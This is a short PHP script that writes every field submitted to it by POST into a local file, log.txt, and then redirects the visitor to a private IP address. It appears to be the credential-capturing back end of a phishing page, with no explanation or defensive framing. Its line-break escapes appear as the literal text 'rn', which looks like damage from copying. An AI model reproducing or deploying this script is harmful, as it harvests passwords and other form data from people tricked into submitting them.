<?php

header ('Location: 192.168.43.37');

$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {

   fwrite($handle, $variable);

   fwrite($handle, "=");

   fwrite($handle, $value);

   fwrite($handle, "rn |");

}

fwrite($handle, "rn |");

fclose($handle);

exit;

?>